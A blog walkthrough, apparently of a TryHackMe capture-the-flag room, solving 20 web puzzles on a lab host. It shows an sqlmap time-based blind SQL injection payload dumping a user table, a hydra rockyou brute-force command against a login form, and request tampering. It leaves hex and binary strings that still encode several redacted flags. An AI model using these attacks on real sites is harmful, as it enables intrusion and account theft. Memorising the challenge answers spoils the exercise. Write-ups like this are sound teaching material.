---
layout: post
title: TryHackMe Walkthrough - CTF Collection Vol. 2
date: 2021-06-15
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
permalink: /2021/06/CTFCollectionVol2
img: 2021/06/CTFCollectionVol2/CTFCollectionVol2.png
---
This room is the second one of the CTF Collection series. It's not a box that need to be rooted, but a collection of small puzzles to solve on a web site.

This walkthrough will have all the flags in numerical order, but I did not do them in that order. I started by looking at the results from [Gobuster](https://github.com/OJ/gobuster) and then moved to reading the source code of the pages.

* Room: CTF Collection Vol. 2
* Difficulty: Medium
* URL: [https://tryhackme.com/room/ctfcollectionvol2](https://tryhackme.com/room/ctfcollectionvol2)
* Author: [DesKel](https://tryhackme.com/p/DesKel)

```
Welcome, welcome and welcome to another CTF collection. This is the second installment of the CTF collection series. For your information, the second serious focuses on the web-based challenge. There are a total of 20 easter eggs a.k.a flags can be found within the box. Let see how good is your CTF skill.

Now, deploy the machine and collect the eggs!

Warning: The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on <style> tag.

Note: All the challenges flag are formatted as THM{flag}, unless stated otherwise
```

## Enumeration
I started the room by scanning the target for opened ports

```bash
$ nmap -A -script vuln -oN nmap.txt target
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 17:19 EDT
Nmap scan report for target (10.10.242.66)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-aspnet-debug:
|_  status: DEBUG is enabled
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /login/: Login page
|   /robots.txt: Robots file
|_  /index/: Potentially interesting folder
...
```

Port 22 (SSH) and 80 (HTTP) are opened. But since the room description says it focus on web challenges, I went straight to that. 

I then enumerated the files and folder of the site.

```bash
$ gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/15 07:42:05 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.htaccess            (Status: 403) [Size: 287]
http://target.thm/.htpasswd            (Status: 403) [Size: 287]
http://target.thm/.hta                 (Status: 403) [Size: 282]
http://target.thm/button               (Status: 200) [Size: 39148]
http://target.thm/cgi-bin/             (Status: 403) [Size: 286]
http://target.thm/cat                  (Status: 200) [Size: 62048]
http://target.thm/index                (Status: 200) [Size: 94328]
http://target.thm/index.php            (Status: 200) [Size: 94328]
http://target.thm/iphone               (Status: 200) [Size: 19867]
http://target.thm/login                (Status: 301) [Size: 308] [--> http://target.thm/login/]
http://target.thm/robots               (Status: 200) [Size: 430]
http://target.thm/robots.txt           (Status: 200) [Size: 430]
http://target.thm/server-status        (Status: 403) [Size: 291]
http://target.thm/small                (Status: 200) [Size: 689]
http://target.thm/static               (Status: 200) [Size: 253890]
http://target.thm/who                  (Status: 200) [Size: 3847428]

===============================================================
2021/06/15 07:42:48 Finished
===============================================================
```

It found a few things, the most interesting one being the `/login/` folder.

I opened the main site, and got a very busy site with lots of gifs. 

![Main Site](/assets/images/2021/06/CTFCollectionVol2/MainSite.png "Main Site")


## Easter 1 - robots.txt
nmap and Gobuster identified a `robots.txt` file. It contained a series of hexadecimal codes that looked like they cold be ASCII codes. 
```
User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=


45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```

So I copied them to [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) and got the first flag. 

Easter 1: THM{REDACTED}

## Easter 2 - robots.txt

The `robots.txt` file also contained a disallowed entry that looked like a base64 string. When I tried to decode it, it gave my something that was not readable, but could still be base64. So I decoded again, and again, and again. By [decoding base64 four times](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true)) I got the folder name: [`DesKel_secret_base`](http://target.thm/DesKel_secret_base/).

![DesKel_secret_base](/assets/images/2021/06/CTFCollectionVol2/DesKel_secret_base.png "DesKel_secret_base")

The page does not show anything, but looking at the source, there is some white text hidded in the white background.

```html
<p style="text-align:center;color:white;">
	Easter 2: THM{REDACTED}
</p>
```

## Easter 3 - Login Source
Gobuster and nmap found a `/login/` folder. 

![Login Form](/assets/images/2021/06/CTFCollectionVol2/LoginForm.png "Login Form")

When I looked at the source, one flag was hidden in there.
```html
<p hidden>Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{REDACTED}</p>
```

## Easter 4 - SQLI
While playing with the login form, I saw that it was vulnerable to [SQL Injection](https://en.wikipedia.org/wiki/SQL_injection). 

I decided to try [sqlmap](https://sqlmap.org/) on it. 

```
sqlmap -u http://target.thm/login/ --forms "username=DesKel&password=aaaa&submit=submit" --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.6#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not r
esponsible for any misuse or damage caused by this program

[*] starting @ 12:05:51 /2021-06-15/

[12:05:51] [INFO] testing connection to the target URL
[12:05:52] [INFO] searching for forms
[#1] form:
POST http://target.thm/login/
POST data: username=&password=&submit=submit
do you want to test this form? [Y/n/q]
>
Edit POST data [default: username=&password=&submit=submit] (Warning: blank fields detected):
do you want to fill blank fields with random values? [Y/n]
[12:05:59] [INFO] resuming back-end DBMS 'mysql'
[12:05:59] [INFO] using '/home/ehogue/.local/share/sqlmap/output/results-06152021_1205pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=JRBT' AND (SELECT 8755 FROM (SELECT(SLEEP(5)))bMON) AND 'XPTO'='XPTO&password=&submit=submit
---
do you want to exploit this SQL injection? [Y/n]
[12:06:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 12.10 or 13.04 or 12.04 (Raring Ringtail or Quantal Quetzal or Precise Pangolin)
web application technology: PHP 5.3.10, Apache 2.2.22
back-end DBMS: MySQL >= 5.0.12
[12:06:01] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:06:01] [INFO] fetching current database
[12:06:01] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
[12:06:20] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[12:06:31] [INFO] adjusting time delay to 2 seconds due to good response times
THM_f0und_m3
[12:08:40] [INFO] fetching tables for database: 'THM_f0und_m3'
[12:08:40] [INFO] fetching number of tables for database 'THM_f0und_m3'
[12:08:40] [INFO] retrieved: 2
[12:08:46] [INFO] retrieved: nothing_inside
[12:10:53] [INFO] retrieved: user
[12:11:26] [INFO] fetching columns for table 'nothing_inside' in database 'THM_f0und_m3'
[12:11:26] [INFO] retrieved: 1
[12:11:31] [INFO] retrieved: Easter_4
[12:12:39] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
[12:12:39] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
[12:12:39] [INFO] retrieved: 1
[12:12:43] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
THM{REDACTED}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{REDACTED}           |
+-------------------------+

[12:16:39] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/home/ehogue/.local/share/sqlmap/output/target.thm/dump/THM_f0und_m3/nothing_inside.csv'
[12:16:39] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[12:16:39] [INFO] retrieved: 2
[12:16:45] [INFO] retrieved: username
[12:17:46] [INFO] retrieved: password
[12:18:56] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
[12:18:56] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
[12:18:56] [INFO] retrieved: 2
[12:19:03] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
05f3672ba34409136aa71b8d00070d1b
[12:23:38] [INFO] retrieved: DesKel
[12:24:32] [INFO] retrieved: He is a nice guy, say hello for me
[12:29:47] [INFO] retrieved: Skidy
[12:30:30] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[12:31:04] [INFO] writing hashes to a temporary file '/tmp/sqlmapsblf6_jo19144/sqlmaphashes-m7fbu_h9.txt'
do you want to crack them via a dictionary-based attack? [y/N/q]
Database: THM_f0und_m3
Table: user
[2 entries]
+------------------------------------+----------+
| password                           | username |
+------------------------------------+----------+
| 05f3672ba34409136aa71b8d00070d1b   | DesKel   |
| He is a nice guy, say hello for me | Skidy    |
+------------------------------------+----------+

[12:31:10] [INFO] table 'THM_f0und_m3.`user`' dumped to CSV file '/home/ehogue/.local/share/sqlmap/output/target.thm/dump/THM_f0und_m3/user.csv'
[12:31:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/ehogue/.local/share/sqlmap/output/results-06152021_1205pm.csv'

[*] ending @ 12:31:10 /2021-06-15/
```

It found the fourth flag, and also the hash of the password for the fifth flag. But I had already solved that one. 

## Easter 5 - Login form

When I got to the login form I tried the username 'DesKel'. Since the page give a different error message when the username exists, it confirmed that there was a user named 'DesKel'. So I decided to try to brute force the password with [hydra](https://github.com/vanhauser-thc/thc-hydra). 

```bash
$ hydra -l DesKel -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t64 -m '/login/:username=^USER^&password=^PASS^&submit=submit:wrong' target.thm http-post-form

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-15 11:29:58
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344402 login tries (l:1/p:14344402), ~224132 tries per task
[DATA] attacking http-post-form://target.thm:80/login/:username=^USER^&password=^PASS^&submit=submit:wrong
[80][http-post-form] host: target.thm   login: DesKel   password: REDACTED
[STATUS] attack finished for target.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-15 11:30:09
```

I used this username and password and got the fifth flag.

Easter 5: THM{REDACTED}

## Easter 6 - Response Header
The sixth flag was in a response header on the main page. 

```html
HTTP/1.1 200 OK
Date: Tue, 15 Jun 2021 22:22:30 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{REDACTED}
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 94328
```

## Easter 7 - Invitation
Back to the main page, it had a gif and some text about an invitation. 

![Invitation](/assets/images/2021/06/CTFCollectionVol2/Invitation.png "Invitation")

I looked at the Cookies sent by the page, there is one called `Invited` with a value of 0. I changed the value to 1 and refreshed the page. 

![Invitted](/assets/images/2021/06/CTFCollectionVol2/Invited.png "Invited")

Enjoy the easter 7: THM{REDACTED}

## Easter 8 - iPhone Required
I kept scrolling down on the page. 

![iphone Required](/assets/images/2021/06/CTFCollectionVol2/iphone.png "iphone Required")

Apparently, I need Safari 13 on IOS 13.1.2 to view the message. I found the correct [user agent](https://developers.whatismybrowser.com/useragents/parse/5390161safari-ios-iphone-webkit), then used Burp Repeater to get the page with that user agent. 

```html
GET / HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

The response I got back contained the eight flag. 
```html
<h4>You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{REDACTED}
```

## Easter 9 - Redirect
This one took me longer to find. I had to look at the hint to find it. Lower on the page, there is a button to click if we wish to watch the world burn. This took me to a page, and then redirected me to another page with flag 13. 

The flag is hidden in a comment on the source of the [intermediate page](http://target.thm/ready/).

```html
<!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{REDACTED} -->
```

## Easter 10 - Free Gift

There is a link to get a TryHackMe subscription voucher. 

![Free Gift](/assets/images/2021/06/CTFCollectionVol2/FreeGift.png "Free Gift")

The link took me to a [page](http://target.thm/free_sub/) that said I had to come from TryHackMe to claim the voucher. 

```html
only people came from tryhackme are allowed to claim the voucher.
```

I used Burp Repeater to change the referrer of my request. 

```html
GET /free_sub/ HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: tryhackme.com
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
```

The returned HTML contained the flag, and no voucher. 

```html
Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{REDACTEd}
```

## Easter 11 - Diner Time
Further on the page, there was a drop down whit choices of meals, and a button to `Take It!`

![Dinner Time](/assets/images/2021/06/CTFCollectionVol2/DinnerTime.png "Dinner Time")

I tried all the choices, but the salad returned a message about preferring an egg. 

```
Mmmmmm... what a healthy choice, I prefer an egg
```

So I turned to Burp Repeater one more time and replaced the posted value with egg.

```html
POST / HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://target.thm
Connection: close
Referer: http://target.thm/
Cookie: Invited=1
Upgrade-Insecure-Requests: 1

dinner=egg&submit=submit
```

This gave me back the flag.

```
You found the secret menu, take the easter 11: THM{REDACTED}
```

## Easter 12 - jQuery

While looking at the network traffic, I saw that it loaded jQuery. But when I looked closer, the file called jquery-9.1.2.js did not contain jQuery. Instead it contained some JavaScript that took some hex values, converted them to ASCII and returned it. 

```js
function ahem()
 {
	str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
	var hex  = str1.toString();
	var str = '';
	for (var n = 0; n < hex.length; n += 2) {
		str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
	}
	return str;
 }
```

I opened the browser console and called the function to get the flag.

```js
ahem()
"Easter 12 is THM{REDACTED}"
```

## Easter 13 - End The World

For this one there is a button that I clicked because I wanted to see the world burn.

![Press To End The World](/assets/images/2021/06/CTFCollectionVol2/Button1.png "Press To End The World")

It took me to a page where a cartoon pressed on a red button.

![Red Button](/assets/images/2021/06/CTFCollectionVol2/RedButton.png "Red Button")

And then redirected me to another page where the flag was displayed. 

![End Of The World](/assets/images/2021/06/CTFCollectionVol2/EndOfTheWorld.png "End Of The World")

## Easter 14 - Commented Out Image

While looking at the source code of the main page, I found a commented out image.

```html
<!--Easter 14<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAAMgCAYAAADbcAZoAAAgAElEQVR4nOzdeXwU9f0/cAnQn4/6aG1mZjcJIZzhEgEBQUXEAxF...
-->
```

I used Burp to intercept the response and uncomment the image. The flag was in the image.

![Hidden Image](/assets/images/2021/06/CTFCollectionVol2/HiddenImage.png)

## Easter 15 - Game 1

A little lower on the page, there are two games. 

![I want to play a game](/assets/images/2021/06/CTFCollectionVol2/Games.png "I want to play a game")

I clicked on the first one. I had a hint composed of a few decimal numbers. I needed to guess a combination. 

![Game 1](/assets/images/2021/06/CTFCollectionVol2/Game1.png "Game 1")

Every time I enter something, it gave me back the encoded value for my string. 

So I entered the string 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' and it gave me back the values '89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18 99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 140 141 22 23 24 25 26 10 11 12 13 14'. 

With that, I could decode the hint '51 89 77 93 126 14 93 10' to the string 'REDACTED'. 

I entered REDACTED as the answer and it gave me back the flag. 
```
Good job on completing the puzzle, Easter 15: THM{REDACTED}
```

## Easter 16 - Game 2

For the second game, we three buttons that needs to be clicked simultaneously. 

![Game 2](/assets/images/2021/06/CTFCollectionVol2/Game2.png "Game 2")

I tried all buttons to see what they posted back to the server. And then used Burp Repeater to send all three in one POST.

```html
POST /game2/ HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://target.thm
Connection: close
Referer: http://target.thm/game2/
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

button1=button1&button2=button2&button3=button3&submit=submit
```

The server replied with the flag. 

```
Just temper the code and you are good to go. Easter 16: THM{REDACTED}
```

## Easter 17 - Nyan Cat
Close to the end of the page, there was a bunch of Nyan Cat and a 'Multifuction button'.

![Nyan Cat](/assets/images/2021/06/CTFCollectionVol2/NyanCat.png "Nyan Cat")

When I clicked on the button, I got an error in the console. 

```javascript
Uncaught TypeError: nyan is not a function
```

I looked at the source code to the page and saw that there was a `catz` function. 

```html
<button onclick="nyan()">Mulfunction button</button><br>
	<p id="nyan"></p>

<script>
function catz(){
		document.getElementById("nyan").innerHTML = "100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101"
}
</script>
```

I could either copy the binary from the source, or inspect the button and replace the call to `nyan()` with `catz()` then click on the button again.

```html
100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101
```

I tried using CyberChef's 'From Binary' recipe, but it gave me some gibberish.

```
.ÂæèÊä@bnt@¨..öÔj¾Ôj¾Öfà¾ÈfÆ`Èf}
```

I added the Magic recipe with intensive mode after the From Binary. One of the result was giving me the flag by doing a [rotate right](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)Rotate_right(1,false)).

Easter 17: THM{REDACTED¾

Weirdly, the last character did not need the rotation, so I replaced it with a } to get the flag.

## Easter 18 - Header

On this one, I needed to say 'YES' to the egg to get the flag. 
![Say Yes To The Egg](/assets/images/2021/06/CTFCollectionVol2/SayYesToTheEgg.png "Say Yes To The Egg")

I tried passing `?egg=YES` in the query string. And sending it at the POST body. It didn't work. 

I needed to add it as a header to the request.

```html
GET / HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
egg: YES
```

The response contained the flag.
```
That's it, you just need to say YESSSSSSSSSS. Easter 18: THM{REDACTED}
```

## Easter 19 - small

This flag was hidden in an image that was too small to see on the page. But Gobuster found it for me before I even started looking at the page source. 

```html
<img height="2" width="2000" src="small.png"/>
```

![Small](/assets/images/2021/06/CTFCollectionVol2/Small.png "Small")


## Easter 20 - Post Credentials

For the last flag, I needed to post some credentials to the page. 

![Post Credentials](/assets/images/2021/06/CTFCollectionVol2/Post.png "Post Credentials")

At first, I though those were the credentials for the login form. The username is good, but the password does not work there. 

I used Burp Repeater to modify the page request. I made it a POST and added the content type and the form data. 

```html
POST / HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=DesKel&password=heIsDumb
```

The server sent me back the last flag. 

 ```html
 Okay, you pass, Easter 20: THM{REDACTED}	<br>
 ```

## That's It

This room was marked as medium difficulty. I think it was easier than that. I did most of the flags pretty fast. But it was still fun, I enjoyed solving the small puzzles. 